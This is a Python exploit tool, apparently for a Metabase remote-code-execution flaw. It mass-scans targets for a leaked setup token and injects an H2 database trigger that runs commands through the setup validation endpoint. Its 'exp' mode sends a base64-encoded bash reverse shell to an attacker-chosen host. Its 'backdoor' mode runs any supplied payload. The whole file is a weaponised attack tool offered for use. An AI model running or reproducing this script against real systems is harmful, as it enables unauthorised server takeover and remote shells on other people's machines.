import argparse
import requests
import base64
import json
import time
from requests.packages import urllib3
from pyfiglet import Figlet

urllib3.disable_warnings()

proxy = {
    "http://":"http://127.0.0.1:8080"
}

f = Figlet(font="banner3-D",width=2000)
print(f.renderText("Metabase_RCE"))
print("Powered by HashRun_Macfy \n")

parser = argparse.ArgumentParser()
parser.add_argument("-u","--url",help="目标域名",type=str)
parser.add_argument("-f","--file",help="存有目标域名的json文件",type=str)
parser.add_argument("--shell_nc",help="是否反弹nc",default=False)
parser.add_argument("-i","--ip",help="反弹服务器地址")
parser.add_argument("-p","--port",help="反弹服务器端口")
parser.add_argument("-t","--token",help="与目标对应token")
parser.add_argument("mode",help="[poc][exp][backdoor]",type=str)
parser.add_argument("-o","--output",help="poc输出文件名")
parser.add_argument("-payload","--payload",help="执行payload代码")


args= parser.parse_args()

def payload_base64():

    cmd = "bash -i >& /dev/tcp/" + args.ip + "/" + args.port + " 0>&1"
    print(cmd)
    cmd = cmd.encode('utf-8')
    cmd_base64 = base64.b64encode(cmd)
    print(cmd_base64)
    return cmd_base64.decode('utf-8','ignore')


def file_processing():
     num=0
     with open(args.file, encoding='utf-8') as f:
         print("[+]正在读取",args.file)
         while True:
             try:
                 num+=1
                 
                 line = f.readline()
                 if not line:
                     break
                 json_line = json.loads(line)
                 domain = json_line['link']
                 if "http" in line:
                     print(domain)
                     token = poc(domain)
                 else:
                     domain = "http://"+domain
                     token = poc(domain)
             except:
                 time.sleep(0.5)
                 print("[-]出现错误，已测试"+str(num)+"条")


def poc(domain):
     
     url = domain+'/api/session/properties'

     header={
         'Content-Type':'application/json',
         'Connection':'close'
     }

     try:
         response = requests.get(url,headers=header, timeout=None,verify=False)

         
         resp_json=response.json()
         try:
             token = resp_json['setup-token']
             print("[+]漏洞可能存在，token值为：" + token)
             with open(args.output, 'a+') as f:
                 time.sleep(0.5)
                 data = '{"host":"'+domain+'","token":"'+token+'"}'
                 
                 f.write(data+'\n')
                 return token
         except:
                 print("[-]token未泄露漏洞不存在")    
         
     except:
         print("[-]出现错误，连接错误")



def exp_nc(url,token):
        print("目标地址：",url)
        url = url+'/api/setup/validate'
        b_cmd = payload_base64()
        nc="'bash -c {echo," + b_cmd + "}|{base64,-d}|{bash,-i}'"
        #nc= "'bash -c {echo,}|{base64,-d}|{bash,-i}'"
        print(url)
        header={
            'Content-Type':'application/json',
            'Connection':'close'
        }
        body = {
            "token": token,
            "details":
            {
            "is_on_demand": 'false',
            "is_full_sync": 'false',
            "is_sample": 'false',
            "cache_ttl": 'null',
            "refingerprint": 'false',
            "auto_run_queries": 'true',
            "schedules":
            {},
            "details":
            {
                "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec("+nc+")\n$$--=x",
                "advanced-options": 'false',
                "ssl": 'true'
            },
            "name": "an-sec-research-team",
            "engine": "h2"
            }
        }

        r = requests.post(url,json=body,headers=header,verify=False,timeout=None,proxies=proxy)

        resp2_json = r.json()
        if "message" in resp2_json:
            print("[+]尝试获得shell")
        else:
            print("[-]漏洞不存在")


def file_backdoor():
     num=0
     with open(args.file, encoding='utf-8') as f:
         print("[+]正在读取",args.file)
         while True:
             try:
                 num+=1
                 
                 line = f.readline()
                 if not line:
                     break
                 json_line = json.loads(line)
                 token = json_line['token']
                 ip = json_line['host']
                 
                 print("目标地址：",ip)
                 print("目标token",token)
                 print("[...]")
                 exp_backdoor(ip,token)
             except:
                 time.sleep(0.5)
                 print("[-]出现错误，已测试"+str(num)+"条")


def exp_backdoor(ip,token):
    
    url = ip+'/api/setup/validate'
    #b_cmd = payload_base64()
    #nc="'bash -c {echo," + b_cmd + "}|{base64,-d}|{bash,-i}'"
    #nc= "'bash -c {echo,}|{base64,-d}|{bash,-i}'"
    #print(nc)
    payload = args.payload
    

    header={
        'Content-Type':'application/json',
        'Connection':'close'
    }
    body = {
        "token": token,
        "details":
        {
        "is_on_demand": 'false',
        "is_full_sync": 'false',
        "is_sample": 'false',
        "cache_ttl": 'null',
        "refingerprint": 'false',
        "auto_run_queries": 'true',
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec("+payload+")\n$$--=x",
            "advanced-options": 'false',
            "ssl": 'true'
        },
        "name": "an-sec-research-team",
        "engine": "h2"
        }
    }

    r = requests.post(url,json=body,headers=header,verify=False,timeout=None)
    #r = httpx.post(url,json=body,headers=header,verify=False, timeout=None)
    resp2_json = r.json()
    if "message" in resp2_json:
        print("[+]尝试获得shell")
    else:
        print("[-]漏洞不存在")


def file_nc():
     num=0
     with open(args.file, encoding='utf-8') as f:
         print("[+]正在读取",args.file)
         while True:
             try:
                 num+=1
                 
                 line = f.readline()
                 if not line:
                     break
                 json_line = json.loads(line)
                 ip = json_line['host']
                 token = json_line['token']
                 print(1)
                 exp_nc(url=ip,token=token)
             except:
                 time.sleep(0.5)
                 print("[-]出现错误，已测试"+str(num)+"条")


if args.mode == "poc":
    if args.url is None:
        
        file_processing()
    else:
        poc(args.url)
elif args.mode == "exp":
     if args.url is None:
        file_nc()
     else:
         exp_nc(args.url,args.token)
elif args.mode == "backdoor" :
    file_backdoor()
else:
    print("参数错误")

         
